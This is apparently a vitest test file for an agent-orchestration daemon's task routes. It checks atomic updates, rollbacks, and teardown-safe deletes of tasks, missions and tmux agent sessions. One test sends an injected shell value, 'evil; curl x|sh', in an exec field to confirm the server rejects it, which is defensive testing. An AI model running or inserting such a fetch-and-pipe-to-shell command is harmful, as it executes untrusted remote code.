import { describe, it, expect, vi } from 'vitest';
import { TaskRefs } from '../../src/store/taskRefs.js';
import { TaskStore } from '../../plugins/work/src/store/taskStore.js';
import { Readiness } from '../../plugins/work/src/store/readiness.js';
import { MissionStore } from '../../plugins/agents/src/store/missionStore.js';
import { EventBus } from '../../src/api/sse.js';
import type { ElowenEvent } from '../../src/api/sse.js';
import { createServer } from '../../src/api/server.js';
import { makeTestApp } from '../helpers/testApp.js';
import { FakeClock } from '../../src/shared/clock.js';
import { FakeTmuxDriver } from '../../src/tmux/fakeDriver.js';
import { ConfigStore } from '../../src/store/configStore.js';
import { ProjectStore } from '../../src/store/projectStore.js';
import { agentsPluginProvider } from '../helpers/testApp.js';
import type { MissionEngine } from '../../plugins/agents/src/overseer/missionEngine.js';
import { openPluginTablesDb } from '../helpers/pluginTablesDb.js';

/** Make a store's dependency write always fail — stands in for any error inside setDeps (locked DB,
 *  constraint violation) so the create path's atomicity can be observed. */
const failDepsWrite = (store: TaskStore): void => {
  (store as { setDeps: () => void }).setDeps = () => { throw new Error('deps write failed'); };
};

/** tmux whose kill never succeeds AND leaves the session running: a worker that outlived its kill. */
class StubbornTmux extends FakeTmuxDriver {
  override async kill(): Promise<void> { throw new Error('kill failed'); }
}

/** tmux whose kill reports failure although the session is really gone (it exited on its own first) —
 *  the one failure a destructive route may ignore. */
class GhostTmux extends FakeTmuxDriver {
  override async kill(session: string): Promise<void> {
    await super.kill(session);
    throw new Error("can't find session");
  }
}

/** An in-memory daemon app with no user store (open mode → no auth), so these tests exercise the route
 *  logic itself. The task HTTP surface lives in the `work` plugin now, so the REAL plugins are loaded
 *  over these stores — `tmux` is injectable (the routes kill through `ctx.host.tmux()`), and the loaded
 *  'agents' control is returned so a test can make a teardown fail on the very instance the routes use. */
async function makeApp(opts: { engine?: MissionEngine; tmux?: FakeTmuxDriver } = {}) {
  const db = openPluginTablesDb(':memory:');
  db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'elowen','/o')").run();
  const tasks = new TaskStore(db);
  const readiness = new Readiness(db);
  const missions = new MissionStore(db);
  const config = new ConfigStore(db);
  const projects = new ProjectStore(db);
  const bus = new EventBus();
  const events: ElowenEvent[] = [];
  bus.subscribe((e) => events.push(e));
  const tmux = opts.tmux ?? new FakeTmuxDriver();
  const provider = agentsPluginProvider({ db, tasks, readiness, config, projects, bus, tmux });
  // Awaited before the first request so a test's patch on a live control instance is already in place.
  const registry = await provider.get();
  const control = registry.control('agents');
  if (!control) throw new Error('agents plugin failed to load in makeApp');
  // The store the routes actually write through: the work plugin owns the domain and builds its OWN
  // store over the same database, so a test that has to make a write FAIL patches this instance (reads
  // and arrangements can go through the test's own store — same rows).
  const domainTasks = registry.control('tasks')?.store();
  if (!domainTasks) throw new Error('work plugin failed to load in makeApp');
  const app = createServer({
    tasks, taskRefs: new TaskRefs(db), missions, bus,
    engine: opts.engine ?? (null as unknown as MissionEngine),
    tmux,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' },
    clock: new FakeClock(0), config, projects,
    plugins: provider,
  });
  return { app, db, tasks, missions, tmux, events, control, domainTasks };
}

const patch = (body: unknown) => ({ method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) });
const post = (body: unknown) => ({ method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify(body) });

describe('PATCH /tasks/:id validates the whole command before it writes any of it', () => {
  it('a rejected exec alongside a close leaves the task open and publishes nothing', async () => {
    const { app, tasks, events } = await makeApp();
    tasks.create({ id: 't-close', project_id: 1, title: 'T' });
    const res = await app.request('/tasks/t-close', patch({ status: 'closed', outcome: 'ok', exec: 'evil; curl x|sh' }));
    expect(res.status).toBe(400);
    expect(tasks.get('t-close')?.status).toBe('open'); // never closed behind the 400
    expect(events).toEqual([]);                        // and no SSE observer saw a close that did not happen
  });

  it('rolls the accepted fields back when the store refuses a dependency edge', async () => {
    const { app, tasks } = await makeApp();
    tasks.create({ id: 't-dep', project_id: 1, title: 'T' });
    const res = await app.request('/tasks/t-dep', patch({ title: 'renamed', addDep: 'no-such-task' }));
    expect(res.status).toBe(400);
    expect(tasks.get('t-dep')?.title).toBe('T'); // the whole patch rolled back, not just the bad edge
  });

  it('still applies a fully valid patch', async () => {
    const { app, tasks, events } = await makeApp();
    tasks.create({ id: 't-ok', project_id: 1, title: 'T' });
    tasks.create({ id: 't-dep-ok', project_id: 1, title: 'D' });
    const res = await app.request('/tasks/t-ok', patch({ title: 'renamed', status: 'blocked', addDep: 't-dep-ok' }));
    expect(res.status).toBe(200);
    expect(tasks.get('t-ok')?.title).toBe('renamed');
    expect(tasks.get('t-ok')?.status).toBe('blocked');
    expect(tasks.depsFor('t-ok')).toEqual(['t-dep-ok']);
    expect(events).toEqual([{ type: 'task', taskId: 't-ok', status: 'blocked' }]);
  });
});

describe('POST /tasks creates the task and its dependencies atomically', () => {
  it('persists no task when wiring its dependencies fails', async () => {
    const { app, tasks, domainTasks } = await makeApp();
    tasks.create({ id: 'dep-a', project_id: 1, title: 'A' });
    failDepsWrite(domainTasks);
    const res = await app.request('/tasks', post({ id: 'dep-b', project_id: 1, title: 'B', deps: ['dep-a'] }));
    expect(res.status).toBe(500);
    expect(tasks.get('dep-b')).toBeNull(); // never left behind with an empty dependency set
  });
});

describe('destructive task routes keep the row when teardown fails', () => {
  it('DELETE /tasks/:epicId does not delete the epic when its mission cannot be disengaged', async () => {
    const { app, tasks, missions, control } = await makeApp();
    // The delete route tears the mission down through the LIVE agents control, so the failure is wired
    // onto that very engine instance (own property over the class method).
    (control.engine() as { disengage: (id: string) => Promise<void> }).disengage = async () => { throw new Error('tmux down'); };
    tasks.create({ id: 'E', project_id: 1, title: 'Epic', type: 'epic' });
    missions.create({ id: 'm-E', epic_id: 'E', autonomy: 'L3', max_sessions: 1 });
    const res = await app.request('/tasks/E', { method: 'DELETE' });
    expect(res.status).toBe(500);
    expect(tasks.get('E')).not.toBeNull(); // the mission's agents are still live — the row must stay
  });

  it('DELETE /tasks/:id does not delete a running task whose agent survived the kill', async () => {
    const tmux = new StubbornTmux();
    const { app, tasks } = await makeApp({ tmux });
    tasks.create({ id: 't-live', project_id: 1, title: 'T' });
    tasks.setAgent('t-live', 'Nova');
    tasks.setStatus('t-live', 'in_progress');
    await tmux.spawn('elowen-Nova', { cwd: '/o', command: 'agent' });
    const res = await app.request('/tasks/t-live', { method: 'DELETE' });
    expect(res.status).toBe(500);
    expect(tasks.get('t-live')).not.toBeNull();
    expect(await tmux.list()).toContain('elowen-Nova');
  });

  it('DELETE /tasks/:id still deletes when the kill failed on an already-gone session', async () => {
    const tmux = new GhostTmux();
    const { app, tasks } = await makeApp({ tmux });
    tasks.create({ id: 't-ghost', project_id: 1, title: 'T' });
    tasks.setAgent('t-ghost', 'Iris');
    tasks.setStatus('t-ghost', 'in_progress');
    await tmux.spawn('elowen-Iris', { cwd: '/o', command: 'agent' });
    const res = await app.request('/tasks/t-ghost', { method: 'DELETE' });
    expect(res.status).toBe(200);
    expect(tasks.get('t-ghost')).toBeNull();
  });

  it('POST /admin/cleanup wipes nothing when a live mission cannot be disengaged', async () => {
    const engine = { disengage: async () => { throw new Error('tmux down'); }, isActive: () => false } as unknown as MissionEngine;
    const { app, tasks, missions } = await makeApp({ engine });
    tasks.create({ id: 'E2', project_id: 1, title: 'Epic', type: 'epic' });
    missions.create({ id: 'm-E2', epic_id: 'E2', autonomy: 'L3', max_sessions: 1 });
    const res = await app.request('/admin/cleanup', post({}));
    expect(res.status).toBe(500);
    expect(tasks.list()).toHaveLength(1);
    expect(missions.get('m-E2')).not.toBeNull();
  });

  it('POST /admin/cleanup wipes nothing when an agent session survives the sweep', async () => {
    const tmux = new StubbornTmux();
    const { app, tasks } = await makeApp({ tmux });
    tasks.create({ id: 't-sweep', project_id: 1, title: 'T' });
    await tmux.spawn('elowen-Zoe', { cwd: '/o', command: 'agent' });
    const res = await app.request('/admin/cleanup', post({}));
    expect(res.status).toBe(500);
    expect(tasks.list()).toHaveLength(1);
  });

  it('POST /admin/cleanup wipes the operational data once teardown succeeded', async () => {
    const { app, tasks, tmux } = await makeApp();
    tasks.create({ id: 't-gone', project_id: 1, title: 'T' });
    await tmux.spawn('elowen-Ada', { cwd: '/o', command: 'agent' });
    const res = await app.request('/admin/cleanup', post({}));
    expect(res.status).toBe(200);
    expect(tasks.list()).toEqual([]);
    expect(await tmux.list()).toEqual([]);
  });
});

describe('manual launch does not leave an agent behind for a task that disappeared', () => {
  const post = (token: string, body: unknown) => ({ method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' }, body: JSON.stringify(body) });

  it('kills the freshly spawned session when the task was deleted during the spawn', async () => {
    const { app, token, deps, control } = await makeTestApp();
    deps.tasks.create({ id: 'sess-1', project_id: 1, title: 'T' });
    // A concurrent DELETE /tasks/sess-1 lands while the agent is starting: it kills a session that
    // does not exist yet, so nothing stops the worker this launch is about to bring up.
    vi.spyOn(control.spawn(), 'launch').mockImplementation((async (input: { agentName: string }) => {
      deps.tasks.delete('sess-1');
      const session = `elowen-${input.agentName}`;
      await deps.tmux.spawn(session, { cwd: '/o', command: 'agent' });
      return { session };
    }) as never);
    const res = await app.request('/sessions', post(token, { taskId: 'sess-1' }));
    expect(res.status).toBe(500);
    expect(await deps.tmux.list()).toEqual([]); // no agent left running against a task that no longer exists
  });

  it('keeps the session when the claim survived the spawn', async () => {
    const { app, token, deps } = await makeTestApp();
    deps.tasks.create({ id: 'sess-2', project_id: 1, title: 'T' });
    const res = await app.request('/sessions', post(token, { taskId: 'sess-2' }));
    expect(res.status).toBe(201);
    expect(deps.tasks.get('sess-2')?.status).toBe('in_progress');
    expect(await deps.tmux.list()).toHaveLength(1);
  });
});

